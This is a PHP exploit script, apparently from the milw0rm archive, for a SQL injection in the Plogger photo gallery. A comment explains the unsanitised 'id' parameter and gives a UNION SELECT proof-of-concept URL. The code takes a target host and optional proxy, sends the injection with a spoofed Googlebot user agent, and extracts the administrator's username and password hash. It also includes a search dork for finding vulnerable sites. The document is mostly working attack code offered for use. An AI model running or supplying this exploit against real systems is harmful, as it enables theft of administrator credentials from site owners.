#!/usr/bin/php -q -d short_open_tag=on
<?
echo "Plogger <= Beta 2.1 SQL injection / administrative credentials disclosure\r\n";
echo "by rgod rgod@autistici.org\r\n";
echo "site: http://retrogod.altervista.org\r\n\r\n";
echo "-> works with magic_quotes_gpc = Off\r\n\r\n";
echo "dork: intext:\"Powered by Plogger!\" -plogger.org\r\n\r\n";

if ($argc<3) {
echo "Usage: php ".$argv[0]." host path OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to plogger\r\n";
echo "Options:\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /plogger/\r\n";
echo "php ".$argv[0]." localhost /plogger/ -p81\r\n";
echo "php ".$argv[0]." localhost / -P1.1.1.1:80\r\n";
die;
}

/*
  explaination:

  software site: http://www.plogger.org/
  description: "Plogger: The definitive open-source web photo gallery - Plogger
  is a free online photo gallery generation script with automatic thumbnail
  creation, easy installation, and RSS feeds."

  vulnerable code in gallery.php near lines 37-38:

  ...
  if ($_GET["level"] == "slideshow")
	$inHead .= generate_slideshow_js($_GET["id"], "album");
  ...

  "id" GET argument is not properly sanitized before to be passed to
   generate_slideshow_js() func, so, if magic_quotes_gpc = Off, sql injection,
   poc :

  http://[target]/[path]/index.php?level=slideshow&mode=album&id='UNION SELECT
  CONCAT('*USERNAME*:',admin_username,'***'),2,3,CONCAT('*HASH*:',admin_password
  ,'***'),5,6,7,8,9,10,11,12,13,14 FROM plogger_config/*

  query becomes:

  SELECT * FROM plogger_pictures WHERE parent_album = ''UNION SELECT
  CONCAT('*USERNAME*',admin_username,'***'),2,3,CONCAT('*HASH*',admin_password,
  '***'),5,6,7,8,9,10,11,12,13,14 FROM plogger_config/*' ORDER BY
  `date_submitted`

  now, at screen, you have admin credentials                                  */

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

$host=$argv[1];
$path=$argv[2];
if (($path[0]<>'/') | ($path[strlen($path)-1]<>'/'))
{die("Check the path, it must begin and end with a trailing slash\r\n");}
$port=80;
$proxy="";
if ($argv[3]<>'')
{
for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
}
if ($proxy<>'') {$p="http://".$host.":".$port.$path;} else {$p=$path;}

$sql ="'UNION SELECT CONCAT('*USERNAME*',admin_username,'***'),2,3,CONCAT('*HASH*'";
$sql.=",admin_password,'***'),5,6,7,8,9,10,11,12,13,14 FROM plogger_config/*";
$sql=urlencode($sql);
$packet ="GET ".$p."index.php?level=slideshow&mode=album&id=".$sql." HTTP/1.0\r\n";
$packet.="User-Agent: Googlebot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
#debug
#echo quick_dump($packet);
sendpacketii($packet);
if (strstr($html,"*HASH*"))
{
 echo "Exploit succeeded...\r\n";
 $temp=explode("*USERNAME*",$html);
 $temp2=explode("***",$temp[1]);
 $admin_name=$temp2[0];
 echo "Admin name -> ".$admin_name."\r\n";
 $temp=explode("*HASH*",$html);
 $temp2=explode("***",$temp[1]);
 $admin_password=$temp2[0];
 echo "Admin password hash -> ".$admin_password."\r\n";
}
else
{echo "Exploit failed... magic quotes on here or Plogger patched \r\n";}
?>

# milw0rm.com [2006-03-28]
